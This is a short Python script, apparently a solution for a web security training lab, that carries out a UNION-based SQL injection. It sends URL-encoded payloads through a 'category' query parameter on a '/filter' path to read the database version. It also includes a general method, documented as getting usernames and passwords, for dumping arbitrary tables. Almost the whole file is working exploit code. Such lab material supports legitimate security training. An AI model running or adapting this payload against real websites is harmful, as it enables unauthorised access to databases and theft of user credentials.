#!/usr/bin/env python3
"""
SQL injection attack, querying the database type and version on MySQL and Microsoft
"""

import requests

import lab_06


class Lab(lab_06.Lab):
    """Wrapper"""

    def dump_table_encoded(self, fields: list[str],
                           table: str = "") -> requests.models.Response:
        """Get usernames and passwords"""
        fields_str = ",+".join(fields)
        if table:
            table = f"+FROM+{table}"
        payload = {self.key: f"%27+UNION+SELECT+{fields_str}" \
                             f"{table}{self.comment}"}
        payload_str = self._dict_to_str(payload)
        response = self.session.get(self.url + self.path, params=payload_str)
        response.raise_for_status()
        return response


def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter", comment="%23") # urlencoded "#"
    if site.columns_of_string_type() != [0, 1]:
        raise RuntimeError(f"Expected [0, 1]; got {site.columns_of_string_type()}")
    response = site.dump_table_encoded(["@@version", "NULL"])
    version = "\n".join(site.parse_html_table(response.text))
    print(version)


if __name__ == "__main__":
    main()
